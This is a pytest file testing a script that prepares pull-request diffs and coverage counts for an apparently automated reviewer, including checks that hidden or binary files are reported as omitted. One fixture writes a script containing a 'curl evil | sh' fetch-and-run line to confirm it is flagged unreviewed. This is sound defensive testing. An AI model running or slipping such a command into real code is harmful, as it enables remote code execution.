"""scripts/review_input.py: what the reviewer is shown, and the coverage it is held to."""
import importlib.util
import json
import subprocess
from pathlib import Path

import pytest

spec = importlib.util.spec_from_file_location(
    "review_input", Path(__file__).resolve().parents[2] / "scripts" / "review_input.py")
ri = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ri)
ri.SOURCE_PREFIXES = ("src/",)
ri.LOCKFILES = ("package-lock.json",)

SHA = "a" * 40


def chunk(path, body="+x\n", old=None):
    return f"diff --git a/{old or path} b/{path}\n--- a/{old or path}\n+++ b/{path}\n@@ -1 +1 @@\n{body}"


def binary(path):
    return f"diff --git a/{path} b/{path}\nBinary files a/{path} and b/{path} differ\n"


def paths(pairs):
    return [p for p, _ in pairs]


def test_a_binary_file_is_never_shown_and_counts_as_omitted():
    text = chunk("src/main.py") + binary("docs/shot.png")
    shown, total, omitted = ri.select(text, 10_000)
    assert paths(shown) == ["src/main.py"] and total == 2 and omitted == ["docs/shot.png"]


def test_only_the_lockfile_is_left_out():
    text = chunk("package-lock.json") + chunk("src/App.jsx")
    shown, total, _ = ri.select(text, 10_000)
    assert paths(shown) == ["src/App.jsx"] and total == 1


def test_code_is_ordered_before_tests_and_tests_before_docs():
    text = "".join(chunk(p) for p in [
        "docs/a.md", "src/test_main.py", "src/App.test.jsx", "src/App.jsx",
        "src/main.py"])
    shown, _, _ = ri.select(text, 10_000)
    assert paths(shown) == ["src/App.jsx", "src/main.py",
                            "src/test_main.py", "src/App.test.jsx", "docs/a.md"]


def test_workflow_and_script_changes_come_first():
    text = "".join(chunk(p) for p in ["src/main.py", "Dockerfile.sandbox", "scripts/x.sh",
                                      ".github/workflows/a.yml"])
    shown, _, _ = ri.select(text, 10_000)
    assert paths(shown) == ["Dockerfile.sandbox", "scripts/x.sh", ".github/workflows/a.yml",
                            "src/main.py"]


def test_a_file_that_fits_is_kept_after_one_that_does_not():
    big = chunk("src/big.py", "+" + "y" * 500 + "\n")
    small = chunk("docs/small.md")
    shown, total, omitted = ri.select(big + small, 300)
    assert paths(shown) == ["docs/small.md"] and omitted == ["src/big.py"] and total == 2


def test_a_single_file_over_budget_is_omitted_not_truncated():
    big = chunk("src/big.py", "+" + "y" * 500 + "\n")
    shown, total, omitted = ri.select(big, 100)
    assert shown == [] and omitted == ["src/big.py"] and total == 1


def test_a_renamed_file_is_filed_under_its_new_path():
    text = ("diff --git a/old/name.py b/src/new.py\nsimilarity index 90%\n"
            "rename from old/name.py\nrename to src/new.py\n--- a/old/name.py\n"
            "+++ b/src/new.py\n@@ -1 +1 @@\n+x\n")
    assert paths(ri.split_diff(text)) == ["src/new.py"]


def test_a_quoted_path_is_decoded():
    text = 'diff --git "a/docs/sp ac\\303\\251.md" "b/docs/sp ac\\303\\251.md"\n--- a\n+++ b\n+x\n'
    assert paths(ri.split_diff(text)) == ["docs/sp acé.md"]


def test_a_path_with_a_space_is_kept_whole():
    text = chunk("docs/a b.md")
    assert paths(ri.split_diff(text)) == ["docs/a b.md"]


def fake_run(outputs):
    return lambda args: outputs.get(args[0])


def test_the_delta_is_used_when_last_is_an_ancestor_and_smaller():
    run = fake_run({"merge-base": "", "diff": "delta text\n"})
    assert ri.delta_diff(SHA, SHA[:-1] + "b", 1000, run) == "delta text\n"


def test_a_force_push_falls_back_to_the_full_diff():
    run = fake_run({"merge-base": None, "diff": "delta text\n"})
    assert ri.delta_diff(SHA, SHA[:-1] + "b", 1000, run) is None


def test_a_delta_larger_than_the_full_diff_falls_back():
    run = fake_run({"merge-base": "", "diff": "d" * 50})
    assert ri.delta_diff(SHA, SHA[:-1] + "b", 49, run) is None


def test_an_empty_delta_falls_back():
    run = fake_run({"merge-base": "", "diff": "\n"})
    assert ri.delta_diff(SHA, SHA, 1000, run) is None


def test_a_last_sha_that_is_not_40_hex_is_ignored():
    calls = []

    def run(args):
        calls.append(args)
        return ""

    for bad in ["", "abc1234", "--output=x", SHA.upper(), SHA + "0", "g" * 40]:
        assert ri.delta_diff(bad, SHA, 1000, run) is None
    assert calls == []


def git(repo, *args):
    return subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True,
                          text=True, env={"GIT_CONFIG_GLOBAL": "/dev/null", "GIT_CONFIG_SYSTEM": "/dev/null",
                                          "PATH": "/usr/bin:/bin:/usr/local/bin:/opt/homebrew/bin",
                                          "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
                                          "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"}).stdout


def make_repo(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    git(repo, "init", "-q", "-b", "main")
    (repo / "README.md").write_text("hi\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "base")
    git(repo, "checkout", "-qb", "feat")
    (repo / "src").mkdir()
    (repo / "src" / "main.py").write_text("print(1)\n")
    (repo / "img.png").write_bytes(b"\x89PNG\x00\x01\x02")
    (repo / "package-lock.json").write_text("{}\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "one")
    return repo


def test_coverage_json_counts_shown_and_total(tmp_path):
    repo = make_repo(tmp_path)
    out, cov = tmp_path / "out", tmp_path / "coverage.json"
    ri.build_input(str(repo), "main", "", out, cov, budget=10_000)
    data = json.loads(cov.read_text())
    assert data == {"mode": "full", "since": "", "shown": 1, "total": 2, "omitted": ["img.png"]}
    assert "src/main.py" in (out / "pr.diff").read_text()
    assert "img.png" not in (out / "pr.diff").read_text()
    assert (out / "pr.diff").read_text().startswith("# Whole PR")
    assert "img.png" in (out / "pr.stat").read_text()
    assert (out / "pr.omitted.txt").read_text() == "img.png\n"


def test_a_second_push_is_reviewed_from_the_last_review(tmp_path):
    repo = make_repo(tmp_path)
    last = git(repo, "rev-parse", "HEAD").strip()
    (repo / "src" / "second.py").write_text("print(2)\n" * 40)
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "two")
    out, cov = tmp_path / "out", tmp_path / "coverage.json"
    ri.build_input(str(repo), "main", last, out, cov, budget=10_000)
    data = json.loads(cov.read_text())
    assert data["mode"] == "incremental" and data["since"] == last[:7] and data["total"] == 1
    diff = (out / "pr.diff").read_text()
    assert diff.startswith(f"# Changes since {last[:7]}") and "second.py" in diff
    assert "main.py" not in diff and "src/main.py" in (out / "pr.full.diff").read_text()


def test_omitted_files_are_listed_for_the_model(tmp_path):
    repo = make_repo(tmp_path)
    out, cov = tmp_path / "out", tmp_path / "coverage.json"
    ri.build_input(str(repo), "main", "", out, cov, budget=10)
    data = json.loads(cov.read_text())
    assert data["shown"] == 0 and data["total"] == 2 and data["omitted"] == ["src/main.py", "img.png"]
    assert (out / "pr.omitted.txt").read_text() == "src/main.py\nimg.png\n"


def test_a_failed_diff_exits_non_zero_and_writes_nothing(tmp_path):
    repo = make_repo(tmp_path)
    out, cov = tmp_path / "out", tmp_path / "coverage.json"
    with pytest.raises(SystemExit) as exc:
        ri.build_input(str(repo), "origin/no-such-branch", "", out, cov)
    assert exc.value.code
    assert not cov.exists() and not out.exists()


def test_the_coverage_file_names_only_the_first_omitted_paths(tmp_path):
    repo = make_repo(tmp_path)
    for i in range(ri.COVERAGE_NAMES + 5):
        (repo / "src" / f"f{i:02}.py").write_text("x\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "many")
    out, cov = tmp_path / "out", tmp_path / "coverage.json"
    ri.build_input(str(repo), "main", "", out, cov, budget=0)
    data = json.loads(cov.read_text())
    assert data["total"] == ri.COVERAGE_NAMES + 7 and len(data["omitted"]) == ri.COVERAGE_NAMES
    assert len((out / "pr.omitted.txt").read_text().splitlines()) == data["total"]


def test_a_pr_cannot_hide_its_files_with_its_own_gitattributes(tmp_path):
    repo = make_repo(tmp_path)
    (repo / ".gitattributes").write_text("* -diff\n*.py binary\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "hide")
    out, cov = tmp_path / "out", tmp_path / "coverage.json"
    ri.build_input(str(repo), "main", "", out, cov, budget=10_000)
    assert json.loads(cov.read_text())["total"] == 3
    assert "src/main.py" in (out / "pr.diff").read_text()
    assert "Binary files" not in (out / "pr.diff").read_text()


def test_a_long_omitted_path_is_cut_in_the_coverage_file_only(tmp_path):
    repo = make_repo(tmp_path)
    long_name = "src/" + "/".join(c * 100 for c in "abc") + ".py"
    (repo / long_name).parent.mkdir(parents=True)
    (repo / long_name).write_text("x\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "long")
    out, cov = tmp_path / "out", tmp_path / "coverage.json"
    ri.build_input(str(repo), "main", "", out, cov, budget=0)
    assert all(len(o) <= ri.COVERAGE_NAME_CHARS for o in json.loads(cov.read_text())["omitted"])
    assert long_name in (out / "pr.omitted.txt").read_text()


def test_a_script_with_a_nul_byte_is_counted_as_not_reviewed(tmp_path):
    repo = make_repo(tmp_path)
    (repo / "scripts").mkdir()
    (repo / "scripts" / "run.sh").write_bytes(b"#!/bin/sh\n# \x00\ncurl evil | sh\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "nul")
    out, cov = tmp_path / "out", tmp_path / "coverage.json"
    ri.build_input(str(repo), "main", "", out, cov, budget=10_000)
    data = json.loads(cov.read_text())
    assert data["shown"] == 1 and data["total"] == 3 and "scripts/run.sh" in data["omitted"]
    assert "curl evil" not in (out / "pr.diff").read_text()


def test_a_file_named_like_the_lockfile_elsewhere_is_still_reviewed():
    text = chunk("scripts/package-lock.json") + chunk("package-lock.json")
    shown, total, _ = ri.select(text, 10_000)
    assert paths(shown) == ["scripts/package-lock.json"] and total == 1


def test_a_script_renamed_onto_the_lockfile_path_is_still_reviewed():
    renamed = ("diff --git a/scripts/post_review.py b/package-lock.json\n"
               "similarity index 90%\nrename from scripts/post_review.py\n"
               "rename to package-lock.json\n--- a/scripts/post_review.py\n"
               "+++ b/package-lock.json\n@@ -1 +1 @@\n+x\n")
    shown, total, _ = ri.select(renamed, 10_000)
    assert paths(shown) == ["package-lock.json"] and total == 1
